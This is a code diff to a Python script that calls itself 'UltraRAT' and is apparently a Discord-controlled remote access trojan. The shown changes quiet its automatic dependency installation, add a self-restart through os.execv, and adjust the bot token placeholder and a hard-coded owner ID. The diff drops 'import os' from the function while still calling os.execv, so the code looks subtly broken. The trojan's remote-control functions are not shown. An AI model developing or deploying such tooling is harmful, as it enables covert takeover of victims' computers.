@@ -68,10 +68,9 @@ REQUIRED_PACKAGES = [
     "netifaces"
 ]
 
-def _install_missing_packages_and_restart():
+def _install_and_restart_if_needed():
     import subprocess
     import sys
-    import os
 
     # Map PyPI name to import name if different
     import_name_map = {
@@ -101,14 +100,19 @@ def _install_missing_packages_and_restart():
     if missing:
         print(f"[UltraRAT] Installing missing packages: {', '.join(missing)}")
         try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
+            # Use --disable-pip-version-check and --no-input for silent install
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "--disable-pip-version-check", "--no-input", *missing])
         except Exception as e:
             print(f"[UltraRAT] Failed to install required packages: {e}")
             sys.exit(1)
         print("[UltraRAT] Packages installed. Restarting script...")
+        # Ensure all file buffers are flushed before restart
+        sys.stdout.flush()
+        sys.stderr.flush()
+        # Actually restart the script
         os.execv(sys.executable, [sys.executable] + sys.argv)
 
-_install_missing_packages_and_restart()
+_install_and_restart_if_needed()
 
 import platform
 import subprocess
@@ -169,7 +173,7 @@ except ImportError:
     netifaces = None
 
 # ========== CONFIGURATION ==========
-DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "DISCORD_BOT_TOKEN")
+DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "BOT_TOKEN_HERE")
 OWNER_ID = int(os.environ.get("OWNER_ID", "300782693044453376"))
 
 # ========== UTILITY FUNCTIONS ==========
